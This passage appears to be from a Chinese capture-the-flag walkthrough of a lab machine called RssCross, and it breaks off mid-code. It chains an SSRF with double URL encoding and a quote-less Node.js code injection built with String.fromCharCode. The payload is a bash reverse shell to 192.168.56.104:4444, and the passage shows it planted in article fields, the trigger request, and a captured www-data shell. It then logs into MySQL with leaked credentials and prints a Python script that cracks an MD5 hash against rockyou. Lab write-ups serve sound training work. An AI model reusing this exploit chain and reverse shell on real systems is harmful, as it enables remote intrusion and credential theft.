+<p>目标是让 3000 端口的 Node.js 服务执行我们的恶意 Node.js 代码（反弹 Shell）。 由于 <code>/Rssinfo</code> 页面的输出受限于 10 字符，我们需要让 Node.js 服务去请求前台的 <code>/article.show.php</code>（该页面会完整输出无长度限制的 <code>content</code> 字段）。</p>
+<p>我们需要克服两个关键的拦截点：</p>
+<ul>
+<li><strong>拦截点 1 (Payload 语法被破坏)</strong>：PHP 的 <code>htmlspecialchars</code> 会将引号 <code>&quot;</code>、<code>&#39;</code> 转换为实体，导致 JS 语法报错。<ul>
+<li><strong>绕过</strong>：使用 JS 的 <code>String.fromCharCode()</code> 将 Payload 转换为 ASCII 码，实现<strong>无引号</strong>的命令执行。</li>
+</ul>
+</li>
+<li><strong>拦截点 2 (Apache 404 拦截)</strong>：如果直接通过 SSRF 访问 <code>/..%2f..%2f</code> 进行目录穿越，Apache 会在解析层将其还原为实际路径并报 404 错误，导致请求根本无法到达 PHP 脚本。<ul>
+<li><strong>绕过</strong>：使用<strong>双重 URL 编码</strong>（Double URL Encoding），将 <code>%</code> 编码为 <code>%25</code>，即发送 <code>%252f</code>。</li>
+</ul>
+</li>
+</ul>
+<p>先准备好反弹的payload</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.104/4444 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>转换为node.js形式</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">global</span>.<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.104/4444 0&gt;&amp;1&quot;&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>使用 <code>String.fromCharCode</code> 进行 ASCII 编码绕过过滤，最终构造成符合 Node.js 正则匹配的格式：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> passage = &#123;a:<span class="hljs-number">1</span>&#125;; global.process.mainModule.require(String.fromCharCode(<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">105</span>,<span class="hljs-number">108</span>,<span class="hljs-number">100</span>,<span class="hljs-number">95</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>)).exec(String.fromCharCode(<span class="hljs-number">98</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">104</span>,<span class="hljs-number">32</span>,<span class="hljs-number">45</span>,<span class="hljs-number">99</span>,<span class="hljs-number">32</span>,<span class="hljs-number">34</span>,<span class="hljs-number">98</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">104</span>,<span class="hljs-number">32</span>,<span class="hljs-number">45</span>,<span class="hljs-number">105</span>,<span class="hljs-number">32</span>,<span class="hljs-number">62</span>,<span class="hljs-number">38</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">100</span>,<span class="hljs-number">101</span>,<span class="hljs-number">118</span>,<span class="hljs-number">47</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">112</span>,<span class="hljs-number">47</span>,<span class="hljs-number">49</span>,<span class="hljs-number">57</span>,<span class="hljs-number">50</span>,<span class="hljs-number">46</span>,<span class="hljs-number">49</span>,<span class="hljs-number">54</span>,<span class="hljs-number">56</span>,<span class="hljs-number">46</span>,<span class="hljs-number">53</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,<span class="hljs-number">49</span>,<span class="hljs-number">48</span>,<span class="hljs-number">52</span>,<span class="hljs-number">47</span>,<span class="hljs-number">52</span>,<span class="hljs-number">52</span>,<span class="hljs-number">52</span>,<span class="hljs-number">52</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">62</span>,<span class="hljs-number">38</span>,<span class="hljs-number">49</span>,<span class="hljs-number">34</span>)); //&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>现在发表新文章构造payload</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">┌──(root㉿kaada)-[/home/kali/Desktop]</span><br><span class="language-xml">└─# curl http://192.168.56.53/admin/article.modify.php?id=7</span><br><span class="language-xml"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>修改文章 - RssCross 管理后台<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../commen.css&quot;</span>/&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;head&quot;</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;header_title&quot;</span>&gt;</span></span><br><span class="language-xml">                    📰 RssCross 管理后台</span><br><span class="language-xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../index.php&quot;</span>&gt;</span>返回首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;header_border&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">                <span class="hljs-comment">&lt;!--内容部分--&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content_box&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;left_bar&quot;</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;article.add.php&quot;</span>&gt;</span>➕ 新增文章<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;article.manage.php&quot;</span>&gt;</span>📋 文章列表<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;right_content&quot;</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;right_content_title&quot;</span>&gt;</span></span><br><span class="language-xml">                                        ✏️ 修改文章</span><br><span class="language-xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;article.modify.handle.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;7&quot;</span> /&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;10px&quot;</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">                                                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>标题<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">                                                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;title&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;title&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacker&quot;</span> <span class="hljs-attr">required</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">                                                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>作者<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">                                                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacker&quot;</span> <span class="hljs-attr">required</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">                                                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>描述<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">                                                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">required</span>&gt;</span>var passage = </span><span class="hljs-template-variable">&#123;a:1&#125;</span><span class="language-xml">; global.process.mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).exec(String.fromCharCode(98,97,115,104,32,45,99,32,34,98,97,115,104,32,45,105,32,62,38,32,47,100,101,118,47,116,99,112,47,49,57,50,46,49,54,56,46,53,54,46,49,48,52,47,52,52,52,52,32,48,62,38,49,34)); //&#125;;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">                                                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">                                                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">required</span>&gt;</span>var passage = </span><span class="hljs-template-variable">&#123;a:1&#125;</span><span class="language-xml">; global.process.mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).exec(String.fromCharCode(98,97,115,104,32,45,99,32,34,98,97,115,104,32,45,105,32,62,38,32,47,100,101,118,47,116,99,112,47,49,57,50,46,49,54,56,46,53,54,46,49,48,52,47,52,52,52,52,32,48,62,38,49,34)); //&#125;;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">                                                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;💾 保存修改&quot;</span>/&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span> 2024 RssCross. All rights reserved.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>                                                     </span><br></code></pre></td></tr></table></figure>
+
+<p>本地开启监听4444端口准备触发</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://<span class="hljs-number">192.168.56.53</span>/GetRss/index.php/..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>farticle.show.php%<span class="hljs-number">253</span>fid=<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p>触发请求后，Apache 将解码后的 <code>%2f</code> 传递给 PHP，PHP 通过 cURL 请求内部的 3000 端口。Node.js 接收到 <code>http://localhost/article.show.php?id=7</code> 的响应，正则提取出我们伪造的无引号 JS 代码并放入 <code>Function()</code> 中执行。</p>
+<p>此时，攻击机的 Netcat 成功接收到反弹回来的 Shell，获取服务器权限。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(root㉿kaada)-[/home/kali/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-comment"># ./penelope.py </span><br>[+] <span class="hljs-title class_">Listening</span> <span class="hljs-keyword">for</span> reverse shells on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">4444</span> →  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">21.128</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">10.150</span> • <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span><br>➤  🏠 <span class="hljs-title class_">Main</span> <span class="hljs-title class_">Menu</span> (m) 💀 <span class="hljs-title class_">Payloads</span> (p) 🔄 <span class="hljs-title class_">Clear</span> (<span class="hljs-title class_">Ctrl</span>-L) 🚫 <span class="hljs-title class_">Quit</span> (q/<span class="hljs-title class_">Ctrl</span>-C)<br>[+] <span class="hljs-title class_">Got</span> reverse shell from <span class="hljs-title class_">RssCross</span><span class="hljs-number">-192.168</span>.<span class="hljs-number">56.53</span>-<span class="hljs-title class_">Linux</span>-x86_64 😍 <span class="hljs-title class_">Assigned</span> <span class="hljs-title class_">SessionID</span> &lt;<span class="hljs-number">1</span>&gt;<br>[+] <span class="hljs-title class_">Attempting</span> to upgrade shell to <span class="hljs-title class_">PTY</span>...<br>[+] <span class="hljs-title class_">Shell</span> upgraded successfully using /usr/bin/python3! 💪<br>[+] <span class="hljs-title class_">Interacting</span> <span class="hljs-keyword">with</span> session [<span class="hljs-number">1</span>], <span class="hljs-title class_">Shell</span> <span class="hljs-symbol">Type:</span> <span class="hljs-title class_">PTY</span>, <span class="hljs-title class_">Menu</span> <span class="hljs-symbol">key:</span> <span class="hljs-title class_">F12</span> <br>[+] <span class="hljs-title class_">Logging</span> to /root/.penelope/<span class="hljs-title class_">RssCross</span>~<span class="hljs-number">192.168</span>.<span class="hljs-number">56.53_</span>Linux_x86_64/<span class="hljs-number">2026_03_26</span><span class="hljs-number">-22_33_25</span><span class="hljs-number">-099</span>.log 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>www-data<span class="hljs-variable">@RssCross</span><span class="hljs-symbol">:/app</span><span class="hljs-variable">$ </span>ls<br>app.js  node_modules  package.json  package-lock.json<br>www-data<span class="hljs-variable">@RssCross</span><span class="hljs-symbol">:/app</span><span class="hljs-variable">$ </span>cd /home<br>www-data<span class="hljs-variable">@RssCross</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls<br>mob  zb<br>www-data<span class="hljs-variable">@RssCross</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>cd zb/<br>www-data<span class="hljs-variable">@RssCross</span><span class="hljs-symbol">:/home/zb</span><span class="hljs-variable">$ </span>ls<br>user.txt<br>www-data<span class="hljs-variable">@RssCross</span><span class="hljs-symbol">:/home/zb</span><span class="hljs-variable">$ </span>cat user.txt <br></code></pre></td></tr></table></figure>
+
+<p>之前的connect.php有泄露mysql的用户名和密码，连上去可以得到一串哈希。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span> -u ctf -p&#x27;<span class="hljs-number">98</span>vwqld912!@<span class="hljs-number">823</span>c@#&#x27; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MariaDB [flag]&gt; show databases;<br><span class="hljs-code">+--------------------+</span><br><span class="hljs-section">| Database           |</span><br><span class="hljs-section">+--------------------+</span><br>| article            |<br>| flag               |<br>| information<span class="hljs-emphasis">_schema |</span><br><span class="hljs-emphasis">| mysql              |</span><br><span class="hljs-emphasis">| performance_schema |</span><br><span class="hljs-emphasis">+--------------------+</span><br><span class="hljs-emphasis">5 rows in set (0.001 sec)</span><br><span class="hljs-emphasis">Database changed</span><br><span class="hljs-emphasis">MariaDB [flag]&gt; show tables;</span><br><span class="hljs-emphasis">+----------------+</span><br><span class="hljs-emphasis">| Tables_in_</span>flag |<br><span class="hljs-code">+----------------+</span><br><span class="hljs-section">| echo           |</span><br><span class="hljs-section">+----------------+</span><br>1 row in set (0.000 sec)<br><br>MariaDB [flag]&gt; select * from echo;<br><span class="hljs-code">+----------------------------------+</span><br><span class="hljs-section">| try                              |</span><br><span class="hljs-section">+----------------------------------+</span><br><span class="hljs-section">| 07e2a8ac8bd28bc3a0ffc4fab3145b5b |</span><br><span class="hljs-section">+----------------------------------+</span><br>1 row in set (0.000 sec)<br><br><br></code></pre></td></tr></table></figure>
+
+<p>这里也是比较坑人的，问了提示才知道因为echo password | md5sum没有加-n参数，导致正常的john和hashcat是跑不出来的，魔鬼藏在细节中。</p>
+<p>（之前就被这种小细节坑过，还不长记性）</p>
+<p>用下面的脚本爆破出密码。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# cat exp.py  <br>import hashlib<br>import sys<br><br>target_hash = <span class="hljs-string">&quot;07e2a8ac8bd28bc3a0ffc4fab3145b5b&quot;</span><br>wordlist = <span class="hljs-string">&quot;rockyou.txt&quot;</span><br><br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;[*] 开始执行爆破...&quot;</span>)<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;[*] 目标 Hash : &#123;target_hash&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;[*] 字典文件  : &#123;wordlist&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * 40)<br><br>try:<br>    # 忽略解码错误，防止字典里有乱码导致脚本崩溃<br>    with open(wordlist, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;utf-8&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;ignore&quot;</span>) as f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            # 清理字典自带的换行和回车符，拿到纯净的单词<br>            word = line.strip(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>            <br>            # 1. 模拟 `echo -n` (不带换行符)<br>            hash_no_newline = hashlib.md5(word.encode()).hexdigest()<br>            <br>            # 2. 模拟 `echo` (带换行符 <span class="hljs-string">&#x27;\n&#x27;</span>)<br>            hash_with_newline = hashlib.md5((word + <span class="hljs-string">&#x27;\n&#x27;</span>).encode()).hexdigest()<br><br>            # 对比目标 Hash<br>            <span class="hljs-keyword">if</span> hash_no_newline == target_hash:<br>                <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;\n[+] 🎉 爆破成功 (无换行 / echo -n)!&quot;</span>)<br>                <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;[+] 密码明文 : &#123;word&#125;&quot;</span>)<br>                sys.exit(0)<br>                <br>            <span class="hljs-keyword">if</span> hash_with_newline == target_hash:<br>                <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;\n[+] 🎉 爆破成功 (带换行 / 默认 echo)!&quot;</span>)<br>                <span 